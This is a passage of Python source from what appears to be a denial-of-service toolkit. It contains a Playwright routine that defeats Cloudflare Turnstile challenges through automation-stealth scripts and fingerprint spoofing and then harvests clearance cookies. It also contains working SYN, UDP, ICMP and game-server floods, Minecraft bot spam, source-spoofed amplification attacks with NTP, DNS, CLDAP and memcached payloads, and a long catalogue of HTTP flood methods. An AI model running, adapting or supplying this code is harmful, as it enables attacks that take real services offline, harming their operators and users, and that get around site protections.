                # Turnstile interaction
                solved = False
                for attempt in range(12):
                    for frame in page.frames:
                        try:
                            f_url = frame.url.lower()
                            if any(k in f_url for k in ["cloudflare", "turnstile", "challenge"]):
                                box = frame.frame_element().bounding_box()
                                if box:
                                    tx = box['x'] + (box['width'] * (0.1 + random.random() * 0.2))
                                    ty = box['y'] + (box['height'] * (0.3 + random.random() * 0.4))
                                    page.mouse.move(tx, ty, steps=randint(8, 15))
                                    sleep(0.3 + random.random() * 0.3)
                                    page.mouse.click(tx, ty)
                                    solved = True
                                    break
                        except Exception:
                            continue
                    
                    if not solved:
                        for sel in ["input[type='checkbox']", "#challenge-stage", ".ctp-checkbox-container", "[role='checkbox']"]:
                            try:
                                if page.locator(sel).count() > 0 and page.locator(sel).is_visible():
                                    page.locator(sel).click(timeout=2000, delay=randint(50, 150))
                                    solved = True
                                    break
                            except Exception:
                                pass
                    
                    if solved:
                        page.wait_for_timeout(3000)
                        try:
                            title = page.title().lower()
                            if "just a moment" not in title and title:
                                break
                        except Exception:
                            break
                        solved = False
                    
                    page.mouse.move(randint(100, 800), randint(100, 600), steps=5)
                    sleep(1.5)
                
                # Wait for cf_clearance to appear
                for _ in range(20):
                    try:
                        cookies_list = context.cookies()
                        if any(c['name'] == 'cf_clearance' for c in cookies_list):
                            break
                    except Exception:
                        break
                    sleep(1.5)
                
                # Harvest cookies
                cookie_str = ""
                ua = user_agent
                try:
                    cookies_list = context.cookies()
                    cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies_list])
                    ua = page.evaluate("navigator.userAgent")
                except Exception:
                    pass
                
                t2d_elapsed = round(time() - t2d_start, 2)
                if "cf_clearance" in cookie_str:
                    HttpFlood._active_solver = "CloakBrowser"
                    logger.info(f"{bcolors.OKGREEN}[*] Tier 2d: CloakBrowser SUCCESS in {t2d_elapsed}s. cf_clearance obtained.{bcolors.RESET}")
                    return cookie_str, ua
                else:
                    logger.warning(f"{bcolors.WARNING}[!] Tier 2d: CloakBrowser failed after {t2d_elapsed}s. No cf_clearance. Falling through...{bcolors.RESET}")
            except Exception as e:
                t2d_elapsed = round(time() - t2d_start, 2)
                logger.error(f"{bcolors.FAIL}[!] Tier 2d: CloakBrowser FAILED in {t2d_elapsed}s: {type(e).__name__}: {e}{bcolors.RESET}")
                logger.debug(f"[!] Tier 2d Traceback:\n{traceback.format_exc()}")
            finally:
                try:
                    if browser: browser.close()
                except: pass
                try:
                    if 'asyncio.events' in sys.modules:
                        sys.modules['asyncio.events']._set_running_loop(None)
                except Exception:
                    pass

        if not PLAYWRIGHT_INSTALLED:
            logger.error("[!] Playwright is not installed. CFBUAM requires playwright or nodriver.")
            return None, None
            
        if not user_agent:
            user_agent = ML_ENGINE.get_fingerprint()["ua"]

        is_windows = sys.platform.lower().startswith('win')
        try:
            with sync_playwright() as p:
                launch_args = {
                    "headless": not is_windows, # Turnstile frequently requires a real rendering context
                    "args": [
                        "--disable-blink-features=AutomationControlled",
                        "--no-sandbox",
                        "--disable-setuid-sandbox",
                        "--ignore-certificate-errors",
                        "--disable-web-security",
                        "--allow-running-insecure-content",
                        "--disable-infobars",
                        "--window-position=-32000,-32000",
                        "--ignore-certifcate-errors",
                        "--ignore-certifcate-errors-spki-list",
                    ],
                    "ignore_default_args": ["--enable-automation"]
                }
                
                if proxy:
                    proxy_url = f"http://{proxy}" if not "://" in proxy else proxy
                    launch_args["proxy"] = {"server": proxy_url}
                    
                browser = p.chromium.launch(**launch_args)
                try:
                    context = browser.new_context(
                        viewport={'width': 1920 + randint(-10, 10), 'height': 1080 + randint(-10, 10)},
                        user_agent=user_agent,
                        device_scale_factor=1,
                        has_touch=True,
                    )
                    
                    page = context.new_page()
                    if STEALTH_INSTALLED:
                        try:
                            Stealth().apply_stealth_sync(page)
                        except: pass
                    
                    page.add_init_script("""
                        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                        window.chrome = { runtime: {} };
                        Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
                        Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
                        Object.defineProperty(navigator, 'deviceMemory', {get: () => 8});
                        Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8});
                        
                        const getParameter = WebGLRenderingContext.prototype.getParameter;
                        WebGLRenderingContext.prototype.getParameter = function(parameter) {
                            if (parameter === 37445) return 'Intel Inc.';
                            if (parameter === 37446) return 'Intel(R) Iris(TM) Plus Graphics 640';
                            return getParameter.apply(this, arguments);
                        };
                    """)
                    
                    logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Navigating and solving challenges...{bcolors.RESET}")
                    
                    try:
                        page.goto(url, wait_until="domcontentloaded", timeout=15000)
                    except Exception:
                        pass
                    
                    try:
                        sleep(2)
                        # Human-like scrolling jitter
                        page.mouse.wheel(0, randint(200, 500))
                        sleep(0.5)
                        page.mouse.wheel(0, -randint(200, 500))
                        
                        solved = False
                        for attempt in range(15):
                            page.wait_for_timeout(1000)
                            
                            # Check frame URLs (Most reliable for Cloudflare Turnstile)
                            for frame in page.frames:
                                try:
                                    f_url = frame.url.lower()
                                    if any(k in f_url for k in ["cloudflare", "turnstile", "challenge"]):
                                        logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Challenge widget found in frame. Interaction pulse {attempt+1}...{bcolors.RESET}")
                                        box = frame.frame_element().bounding_box()
                                        if box:
                                            target_x = box['x'] + (box['width'] * 0.15)
                                            target_y = box['y'] + (box['height'] * 0.5)
                                            page.mouse.move(target_x, target_y, steps=10)
                                            sleep(0.5)
                                            page.mouse.click(target_x, target_y)
                                            logger.debug(f"[*] Headless Recon: Pulse click at {target_x}, {target_y}")
                                            solved = True
                                            break
                                except: continue
                                
                            # Fallback: CSS Selectors without timeout blocking
                            if not solved:
                                selectors = ["input[type='checkbox']", "#challenge-stage", "div.ctp-checkbox-container", ".check", "[role='checkbox']", "#cf-stage"]
                                for selector in selectors:
                                    try:
                                        if page.locator(selector).count() > 0 and page.locator(selector).is_visible():
                                            logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Challenge widget detected on main page. Pulse {attempt+1}...{bcolors.RESET}")
                                            page.locator(selector).click(timeout=2000, delay=100)
                                            solved = True
                                            break
                                    except: pass
                                    
                            if solved: 
                                page.wait_for_timeout(3000)
                                try:
                                    if "just a moment" not in page.title().lower():
                                        break
                                except Exception as e:
                                    if "Execution context was destroyed" in str(e):
                                        logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Navigation detected. Challenge likely bypassed.{bcolors.RESET}")
                                        break
                                solved = False
                            
                            # Background JS Challenges require simple mouse movement without clicks
                            page.mouse.move(randint(100, 900), randint(100, 900), steps=5)
                            sleep(1.0)
                    except Exception as e:
                        if "Execution context was destroyed" in str(e):
                            logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Navigation detected during interaction.{bcolors.RESET}")
                        else:
                            logger.debug(f"[*] Headless Recon: Interaction Error: {e}\n{traceback.format_exc()}")
     
                    logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Waiting for bypass validation...{bcolors.RESET}")
                    for i in range(40):
                        try:
                            cookies_list = context.cookies()
                            if any(c['name'] == 'cf_clearance' for c in cookies_list):
                                logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Cloudflare Clearance Obtained!{bcolors.RESET}")
                                break
                        except Exception as e:
                            logger.debug(f"[*] Headless Recon: Failed to get cookies during validation: {e}")
                            break
                        
                        try: 
                            title = page.title().lower()
                            content = page.content().lower()
                            is_challenge = any(k in title or k in content for k in ["just a moment", "checking your browser", "enable javascript", "access denied", "attention required"])
                            if not is_challenge and title != "" and len(content) > 2000:
                                logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Barrier Breached (Fidelity: HIGH). Page Title: {page.title()}{bcolors.RESET}")
                                break
                        except Exception as e:
                            if "Execution context was destroyed" in str(e):
                                logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Context destroyed (Navigated). Extracting cookies...{bcolors.RESET}")
                                break
                            else:
                                logger.debug(f"[*] Headless Recon: Validation loop error: {e}")
                        sleep(1.5)
                    
                    final_title = ""
                    try: 
                        final_title = page.title()
                        final_title = str(final_title).encode('ascii', 'ignore').decode('ascii')
                    except: pass
                    
                    try:
                        cookies_list = context.cookies()
                        cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies_list])
                        ua = page.evaluate("navigator.userAgent")
                        logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Protocol finished. Page Title: {final_title} | Cookies length: {len(cookies_list)}{bcolors.RESET}")
                    except Exception as e:
                        logger.debug(f"[*] Headless Recon: Failed to extract final cookies/ua: {e}")
                        cookie_str = ""
                        ua = user_agent
                        logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Protocol finished with exception. Page Title: {final_title}{bcolors.RESET}")
                    
                    if "cf_clearance" not in cookie_str:
                        logger.warning(f"{bcolors.WARNING}[!] Headless Recon: Failed to obtain cf_clearance in Playwright fallback.{bcolors.RESET}")
                        try:
                            if not is_challenge and title != "" and len(content) > 2000:
                                logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: UAM appears to be disabled. Returning dummy clearance.{bcolors.RESET}")
                                cookie_str = "cf_clearance=uam_disabled"
                            else:
                                return None, None
                        except Exception:
                            return None, None
                    
                    HttpFlood._active_solver = "Playwright"
                    return cookie_str, ua
                finally:
                    try:
                        browser.close()
                    except: pass
                
        except Exception as e:
            logger.error(f"{bcolors.FAIL}[!] Headless Recon Playwright Fallback Failed: {e}\n{traceback.format_exc()}{bcolors.RESET}")
            return None, None

class Minecraft:
    @staticmethod
    def varint(d: int) -> bytes:
        o = b""
        while True:
            b = d & 0x7F
            d >>= 7
            o += data_pack("B", b | (0x80 if d > 0 else 0))
            if d == 0:
                break
        return o

    @staticmethod
    def data(*payload: bytes) -> bytes:
        payload = b"".join(payload)
        return Minecraft.varint(len(payload)) + payload

    @staticmethod
    def short(integer: int) -> bytes:
        return data_pack(">H", integer)

    @staticmethod
    def long(integer: int) -> bytes:
        return data_pack(">q", integer)

    @staticmethod
    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
        return Minecraft.data(
            Minecraft.varint(0x00),
            Minecraft.varint(version),
            Minecraft.data(target[0].encode()),
            Minecraft.short(target[1]),
            Minecraft.varint(state),
        )

    @staticmethod
    def handshake_forwarded(
        target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID
    ) -> bytes:
        return Minecraft.data(
            Minecraft.varint(0x00),
            Minecraft.varint(version),
            Minecraft.data(
                target[0].encode(), b"\x00", ip.encode(), b"\x00", uuid.hex.encode()
            ),
            Minecraft.short(target[1]),
            Minecraft.varint(state),
        )

    @staticmethod
    def login(protocol: int, username: str) -> bytes:
        if isinstance(username, str):
            username = username.encode()
        return Minecraft.data(
            Minecraft.varint(
                0x00 if protocol >= 391 else 0x01 if protocol >= 385 else 0x00
            ),
            Minecraft.data(username),
        )

    @staticmethod
    def keepalive(protocol: int, num_id: int) -> bytes:
        return Minecraft.data(
            Minecraft.varint(
                0x0F
                if protocol >= 755
                else (
                    0x10
                    if protocol >= 712
                    else (
                        0x0F
                        if protocol >= 471
                        else (
                            0x10
                            if protocol >= 464
                            else (
                                0x0E
                                if protocol >= 389
                                else (
                                    0x0C
                                    if protocol >= 386
                                    else (
                                        0x0B
                                        if protocol >= 345
                                        else (
                                            0x0A
                                            if protocol >= 343
                                            else (
                                                0x0B
                                                if protocol >= 336
                                                else (
                                                    0x0C
                                                    if protocol >= 318
                                                    else (
                                                        0x0B
                                                        if protocol >= 107
                                                        else 0x00
                                                    )
                                                )
                                            )
                                        )
                                    )
                                )
                            )
                        )
                    )
                )
            ),
            Minecraft.long(num_id) if protocol >= 339 else Minecraft.varint(num_id),
        )

    @staticmethod
    def chat(protocol: int, message: str) -> bytes:
        return Minecraft.data(
            Minecraft.varint(
                0x03
                if protocol >= 755
                else (
                    0x03
                    if protocol >= 464
                    else (
                        0x02
                        if protocol >= 389
                        else (
                            0x01
                            if protocol >= 343
                            else (
                                0x02
                                if protocol >= 336
                                else (
                                    0x03
                                    if protocol >= 318
                                    else 0x02 if protocol >= 107 else 0x01
                                )
                            )
                        )
                    )
                )
            ),
            Minecraft.data(message.encode()),
        )


class Layer4:
    _method: str
    _target: Tuple[str, int]
    _ref: Any
    SENT_FLOOD: Any
    _amp_payloads = cycle
    _proxy_pool: TacticalProxyPool = None

    def __init__(
        self,
        target: Tuple[str, int],
        ref: List[str] = None,
        method: str = "TCP",
        synevent: asyncio.Event = None,
        proxy_pool: TacticalProxyPool = None,
        protocolid: int = 74,
    ):
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self.protocolid = protocolid
        self._method = method
        self._target = target
        self._synevent = synevent
        self._proxy_pool = proxy_pool
        self.methods = {
            "UDP": self.UDP,
            "SYN": self.SYN,
            "VSE": self.VSE,
            "TS3": self.TS3,
            "MCPE": self.MCPE,
            "FIVEM": self.FIVEM,
            "FIVEM-TOKEN": self.FIVEMTOKEN,
            "OVH-UDP": self.OVHUDP,
            "MINECRAFT": self.MINECRAFT,
            "CPS": self.CPS,
            "CONNECTION": self.CONNECTION,
            "MCBOT": self.MCBOT,
        }

    async def run(self) -> None:
        if self._synevent:
            while not self._synevent.is_set():
                await asyncio.sleep(0.1)
        
        self.select(self._method)
        while self._synevent.is_set():
            await self.SENT_FLOOD()
            await asyncio.sleep(0) # Yield control to event loop to prevent stalls

    def open_connection(
        self, conn_type=AF_INET, sock_type=SOCK_STREAM, proto_type=IPPROTO_TCP
    ):
        proxy = None
        if self._proxy_pool:
            proxy = self._proxy_pool.get_proxy()
            if proxy:
                try:
                    s = proxy.open_socket(conn_type, sock_type)
                    s.settimeout(0.9)
                    s.connect(self._target)
                    return s
                except Exception:
                    self._proxy_pool.report_failure(proxy)
                    if 's' in locals() and s:
                        with suppress(Exception): s.close()
                    raise
            else:
                s = socket(conn_type, sock_type, proto_type)
        else:
            s = socket(conn_type, sock_type, proto_type)
        
        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        s.settimeout(0.9)
        s.connect(self._target)
        return s

    async def TCP(self) -> None:
        def _flood():
            try:
                s = self.open_connection(AF_INET, SOCK_STREAM)
                with s:
                    while self._synevent.is_set() and Tools.send(s, randbytes(1024)):
                        continue
            except: pass
        await asyncio.to_thread(_flood)

    async def MINECRAFT(self) -> None:
        handshake = Minecraft.handshake(self._target, self.protocolid, 1)
        ping = Minecraft.data(b"\x00")
        def _flood():
            try:
                s = self.open_connection(AF_INET, SOCK_STREAM)
                with s:
                    while self._synevent.is_set() and Tools.send(s, handshake):
                        Tools.send(s, ping)
            except: pass
        await asyncio.to_thread(_flood)

    async def CPS(self) -> None:
        global REQUESTS_SENT
        def _flood():
            try:
                s = self.open_connection(AF_INET, SOCK_STREAM)
                s.close()
                global REQUESTS_SENT
                REQUESTS_SENT += 1
            except: pass
        await asyncio.to_thread(_flood)

    async def alive_connection(self) -> None:
        def _flood():
            try:
                s = self.open_connection(AF_INET, SOCK_STREAM)
                with s:
                    while self._synevent.is_set():
                        s.recv(1)
            except: pass
        await asyncio.to_thread(_flood)

    async def CONNECTION(self) -> None:
        global REQUESTS_SENT
        asyncio.create_task(self.alive_connection())
        REQUESTS_SENT += 1

    async def UDP(self) -> None:
        """Optimized UDP flood using asyncio-friendly socket handling."""
        def _flood():
            with socket(AF_INET, SOCK_DGRAM) as s:
                data = randbytes(1024)
                target = self._target
                while self._synevent.is_set():
                    try:
                        s.sendto(data, target)
                        global BYTES_SEND, REQUESTS_SENT
                        BYTES_SEND += 1024
                        REQUESTS_SENT += 1
                    except Exception:
                        continue
        await asyncio.to_thread(_flood)

    async def OVHUDP(self) -> None:
        def _flood():
            with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                while self._synevent.is_set():
                    for payload in self._generate_ovhudp():
                        try:
                            s.sendto(payload, self._target)
                            global BYTES_SEND, REQUESTS_SENT
                            BYTES_SEND += len(payload)
                            REQUESTS_SENT += 1
                        except Exception:
                            continue
        await asyncio.to_thread(_flood)

    async def ICMP(self) -> None:
        def _flood():
            payload = self._genrate_icmp()
            with socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                while self._synevent.is_set():
                    try:
                        s.sendto(payload, self._target)
                        global BYTES_SEND, REQUESTS_SENT
                        BYTES_SEND += len(payload)
                        REQUESTS_SENT += 1
                    except Exception:
                        continue
        await asyncio.to_thread(_flood)

    async def SYN(self) -> None:
        """High-efficiency SYN flood with pre-calculated templates."""
        def _flood():
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                target_addr = self._target[0]
                while self._synevent.is_set():
                    packet = self._genrate_syn()
                    try:
                        s.sendto(packet, (target_addr, 0))
                        global BYTES_SEND, REQUESTS_SENT
                        BYTES_SEND += len(packet)
                        REQUESTS_SENT += 1
                    except Exception:
                        continue
        await asyncio.to_thread(_flood)

    async def AMP(self) -> None:
        """High-efficiency Amplification flood."""
        def _flood():
            # Pre-fetch payload generator to avoid cycle overhead
            payload_gen = self._amp_payloads
            with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                while self._synevent.is_set():
                    packet, addr = next(payload_gen)
                    try:
                        s.sendto(packet, addr)
                        global BYTES_SEND, REQUESTS_SENT
                        BYTES_SEND += len(packet)
                        REQUESTS_SENT += 1
                    except Exception:
                        continue
        await asyncio.to_thread(_flood)

    async def MCBOT(self) -> None:
        """Advanced Minecraft Bot flood."""
        def _flood():
            try:
                s = self.open_connection(AF_INET, SOCK_STREAM)
                with s:
                    Tools.send(s, Minecraft.handshake_forwarded(self._target, self.protocolid, 2, ProxyTools.Random.rand_ipv4(), uuid4()))
                    username = f"MCBOT_{ProxyTools.Random.rand_str(5)}"
                    password = b64encode(username.encode()).decode()[:8].title()
                    Tools.send(s, Minecraft.login(self.protocolid, username))
                    sleep(1.5)
                    Tools.send(s, Minecraft.chat(self.protocolid, f"/register {password} {password}"))
                    Tools.send(s, Minecraft.chat(self.protocolid, f"/login {password}"))
                    while self._synevent.is_set():
                        if not Tools.send(s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(128)))): break
                        sleep(1.1)
            except Exception: pass
        await asyncio.to_thread(_flood)

    async def VSE(self) -> None:
        """Valve Source Engine flood."""
        payload = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
        def _flood():
            with socket(AF_INET, SOCK_DGRAM) as s:
                while self._synevent.is_set():
                    try:
                        s.sendto(payload, self._target)
                        global BYTES_SEND, REQUESTS_SENT
                        BYTES_SEND += len(payload)
                        REQUESTS_SENT += 1
                    except Exception: continue
        await asyncio.to_thread(_flood)

    async def FIVEMTOKEN(self) -> None:
        token = str(uuid4())
        steamid_min, steamid_max = 76561197960265728, 76561199999999999
        guid = str(randint(steamid_min, steamid_max))
        payload = f"token={token}&guid={guid}".encode("utf-8")
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                await asyncio.sleep(0)
                continue

    async def FIVEM(self) -> None:
        payload = b"\xff\xff\xff\xffgetinfo xxx\x00\x00\x00"
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                await asyncio.sleep(0)
                continue

    async def TS3(self) -> None:
        payload = b"\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02"
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                await asyncio.sleep(0)
                continue

    async def MCPE(self) -> None:
        payload = b"\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73"
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                await asyncio.sleep(0)
                continue

    def _generate_ovhudp(self) -> List[bytes]:
        packets = []
        methods, paths = (
            ["PGET", "POST", "HEAD", "OPTIONS", "PURGE"],
            [
                "/0/0/0/0/0/0",
                "/0/0/0/0/0/0/",
                "\\0\\0\\0\\0\\0\\0",
                "\\0\\0\\0\\0\\0\\0\\",
                "/",
                "/null",
                "/%00%00%00%00",
            ],
        )
        for _ in range(randint(2, 4)):
            ip, udp = IP(), UDP()
            ip.set_ip_src(__ip__)
            ip.set_ip_dst(self._target[0])
            udp.set_uh_sport(randint(1024, 65535))
            udp.set_uh_dport(self._target[1])
            payload = (
                f"{randchoice(methods)} {randchoice(paths)}{randbytes(randint(1024, 2048)).decode('latin1', 'ignore')} HTTP/1.1\nHost: {self._target[0]}:{self._target[1]}\r\n\r\n"
            ).encode("latin1", "ignore")
            udp.contains(Data(payload))
            ip.contains(udp)
            packets.append(ip.get_packet())
        return packets

    def _genrate_syn(self) -> bytes:
        ip, tcp = IP(), TCP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        tcp.set_SYN()
        tcp.set_th_flags(0x02)
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(ProxyTools.Random.rand_int(32768, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _genrate_icmp(self) -> bytes:
        ip, icmp = IP(), ICMP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        icmp.set_icmp_type(icmp.ICMP_ECHO)
        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 1024)))
        ip.contains(icmp)
        return ip.get_packet()

    def _generate_amp(self):
        """Pre-calculate amplification packets for high-speed delivery."""
        payloads = []
        for ref in self._ref:
            try:
                ip, ud = IP(), UDP()
                ip.set_ip_src(self._target[0])
                ip.set_ip_dst(ref)
                ud.set_uh_dport(self._amp_payload[1])
                ud.set_uh_sport(self._target[1])
                ud.contains(Data(self._amp_payload[0]))
                ip.contains(ud)
                payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
            except Exception:
                continue
        return payloads

    def select(self, name):
        self.SENT_FLOOD = self.TCP
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value
            elif name == "ICMP":
                self.SENT_FLOOD, self._target = self.ICMP, (self._target[0], 0)
            elif name == "RDP":
                self._amp_payload, self.SENT_FLOOD, self._amp_payloads = (
                    (
                        b"\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00",
                        3389,
                    ),
                    self.AMP,
                    cycle(self._generate_amp()),
                )
            elif name == "CLDAP":
                self._amp_payload, self.SENT_FLOOD, self._amp_payloads = (
                    (
                        b"\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00",
                        389,
                    ),
                    self.AMP,
                    cycle(self._generate_amp()),
                )
            elif name == "MEM":
                self._amp_payload, self.SENT_FLOOD, self._amp_payloads = (
                    (b"\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n", 11211),
                    self.AMP,
                    cycle(self._generate_amp()),
                )
            elif name == "CHAR":
                self._amp_payload, self.SENT_FLOOD, self._amp_payloads = (
                    (b"\x01", 19),
                    self.AMP,
                    cycle(self._generate_amp()),
                )
            elif name == "ARD":
                self._amp_payload, self.SENT_FLOOD, self._amp_payloads = (
                    (b"\x00\x14\x00\x00", 3283),
                    self.AMP,
                    cycle(self._generate_amp()),
                )
            elif name == "NTP":
                self._amp_payload, self.SENT_FLOOD, self._amp_payloads = (
                    (b"\x17\x00\x03\x2a\x00\x00\x00\x00", 123),
                    self.AMP,
                    cycle(self._generate_amp()),
                )
            elif name == "DNS":
                self._amp_payload, self.SENT_FLOOD, self._amp_payloads = (
                    (
                        b"\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00",
                        53,
                    ),
                    self.AMP,
                    cycle(self._generate_amp()),
                )


class AsyncHTTPManager:
    """Centralized manager for aiohttp sessions to maximize connection reuse."""
    _session: Optional[aiohttp.ClientSession] = None
    _lock = asyncio.Lock()

    @classmethod
    async def get_session(cls) -> aiohttp.ClientSession:
        if cls._session is None or cls._session.closed:
            async with cls._lock:
                if cls._session is None or cls._session.closed:
                    resolver = aiohttp.AsyncResolver()
                    connector = aiohttp.TCPConnector(
                        ssl=False, 
                        limit=0, 
                        ttl_dns_cache=300,
                        use_dns_cache=True,
                        resolver=resolver
                    )
                    timeout = aiohttp.ClientTimeout(total=10, connect=5)
                    cls._session = aiohttp.ClientSession(
                        connector=connector, 
                        timeout=timeout,
                        headers={"Connection": "keep-alive"}
                    )
        return cls._session

    @classmethod
    async def close(cls):
        if cls._session and not cls._session.closed:
            await cls._session.close()
            cls._session = None


import concurrent.futures

# Global executor for synchronous methods (CFB, BYPASS, DGB)
# This prevents asyncio.to_thread from bottlenecking on the default max_workers limit (which is small).
SYNC_EXECUTOR = concurrent.futures.ThreadPoolExecutor(max_workers=2000)

class HttpFlood:
    _cfbuam_cookie: str = None
    _cfbuam_ua: str = None
    _cfbuam_proxy: str = None
    _cfbuam_lock = asyncio.Lock()
    _cfbuam_expiry: float = 0
    _active_solver: str = None  # Name of the solver that last succeeded
    _solve_phase: str = "idle"  # "idle", "solving", "flooding"
    _readtoon_sem = asyncio.Semaphore(10)
    _curl_cffi_sem = asyncio.Semaphore(500)
    _sample_count = 0
    _waf_blocks = 0
    _circuit_breaker: ProxyCircuitBreaker = ProxyCircuitBreaker(failure_threshold=3, recovery_timeout=60.0)
    
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: URL
    _method: str
    _rpc: int
    _synevent: asyncio.Event
    _proxy_pool: TacticalProxyPool
    SENT_FLOOD: Any

    def __init__(
        self,
        thread_id: int,
        target: URL,
        host: str,
        method: str = "GET",
        rpc: int = 1,
        synevent: asyncio.Event = None,
        useragents: Set[str] = None,
        referers: Set[str] = None,
        proxy_pool: TacticalProxyPool = None,
    ) -> None:
        self.SENT_FLOOD = None
        (
            self._thread_id,
            self._synevent,
            self._rpc,
            self._method,
            self._target,
            self._host,
            self._proxy_pool,
        ) = (
            thread_id,
            synevent,
            rpc,
            method,
            target,
            host,
            proxy_pool,
        )
        self._raw_target = (self._host, (self._target.port or (443 if self._target.scheme == "https" else 80)))
        if not self._target.host[len(self._target.host) - 1].isdigit():
            self._raw_target = (self._host, (self._target.port or (443 if self._target.scheme == "https" else 80)))
        self.methods = {
            "POST": self.POST,
            "CFB": self.CFB,
            "CFBUAM": self.CFBUAM,
            "XMLRPC": self.XMLRPC,
            "BOT": self.BOT,
            "APACHE": self.APACHE,
            "BYPASS": self.BYPASS,
            "DGB": self.DGB,
            "OVH": self.OVH,
            "AVB": self.AVB,
            "STRESS": self.STRESS,
            "DYN": self.DYN,
            "SLOW": self.SLOW,
            "GSB": self.GSB,
            "RHEX": self.RHEX,
            "STOMP": self.STOMP,
            "NULL": self.NULL,
            "COOKIE": self.COOKIES,
            "TOR": self.TOR,
            "EVEN": self.EVEN,
            "DOWNLOADER": self.DOWNLOADER,
            "BOMB": self.BOMB,
            "PPS": self.PPS,
            "KILLER": self.KILLER,
            "HEAD": self.HEAD,
            "IMPERSONATE": self.IMPERSONATE,
            "HTTP3": self.HTTP3,
            "H2FLOOD": self.H2FLOOD,
            "BEHAVIOR": self.BEHAVIOR,
            "ADAPTIVE": self.ADAPTIVE,
            "BROWSER": self.BROWSER,
            "HYBRID": self.HYBRID,
        }
        if not referers:
            referers = [
                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
                ",https://drive.google.com/viewerng/viewer?url=",
                ",https://www.google.com/translate?u=",
            ]
        self._referers = list(referers)
        if not useragents:
            useragents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 ",
                "Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 ",
                "Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 ",
                "Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577",
                "Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931",
